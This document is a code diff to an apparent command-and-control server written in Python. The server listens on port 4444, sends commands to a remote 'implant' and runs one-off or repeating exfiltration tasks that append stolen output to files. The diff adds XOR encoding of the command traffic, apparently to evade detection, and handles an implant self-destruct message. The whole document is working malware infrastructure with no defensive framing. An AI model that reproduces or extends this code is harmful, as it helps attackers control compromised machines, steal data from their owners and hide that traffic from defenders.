@@ -3,10 +3,14 @@ import socket
 import threading
 import time
 
+XOR_KEY = 0x55
 HOST = '0.0.0.0'
 PORT = 4444
 task_counter = 0
 tasks = {}
+
+def xor_encrypt_decrypt(data, key):
+    return bytes([b ^ key for b in data])
 
 def receive_complete(conn):
     data = b""
@@ -14,22 +18,16 @@ def receive_complete(conn):
         chunk = conn.recv(4096)
         if not chunk:
             break
-        data += chunk
-        if b"[*] END\n" in data or b"[-]" in data:
+        decrypted_chunk = xor_encrypt_decrypt(chunk, XOR_KEY)  # Decrypt received chunk
+        data += decrypted_chunk
+        if b"[*] END\n" in decrypted_chunk or b"[-]" in decrypted_chunk or b"Implant self-destructed" in decrypted_chunk:
             break
     return data.decode(errors='ignore')
 
-def exfil_thread(conn, cmd, outfile, repeat, stop_event, task_id):
-    while not stop_event.is_set():
-        conn.sendall((cmd + "\n").encode())
-        data = receive_complete(conn)
-        if outfile:
-            with open(outfile, "ab") as f:
-                f.write(data.encode())
-        time.sleep(repeat)
 
 def exfil_once(conn, cmd, outfile):
-    conn.sendall((cmd + "\n").encode())
+    encrypted_cmd = xor_encrypt_decrypt((cmd + "\n").encode(), XOR_KEY)  # Encrypt the exfil command
+    conn.sendall(encrypted_cmd)
     data = receive_complete(conn)
     if outfile:
         with open(outfile, "ab") as f:
@@ -37,6 +35,16 @@ def exfil_once(conn, cmd, outfile):
         print(f"[+] Exfiltrated data appended to {outfile}")
     else:
         print(data)
+
+def exfil_thread(conn, cmd, outfile, repeat, stop_event, task_id):
+    while not stop_event.is_set():
+        encrypted_cmd = xor_encrypt_decrypt((cmd + "\n").encode(), XOR_KEY)  # Encrypt the exfil command
+        conn.sendall(encrypted_cmd)
+        data = receive_complete(conn)
+        if outfile:
+            with open(outfile, "ab") as f:
+                f.write(data.encode())
+        time.sleep(repeat)
 
 def parse_command(cmd):
     parts = cmd.split()
@@ -123,7 +131,8 @@ try:
             else:
                 exfil_once(conn, real_cmd, outfile)
         else:
-            conn.sendall((real_cmd + "\n").encode())
+            encrypted_cmd = xor_encrypt_decrypt((real_cmd + "\n").encode(), 0x55)
+            conn.sendall(encrypted_cmd)
             try:
                 data = receive_complete(conn)
                 if not data:
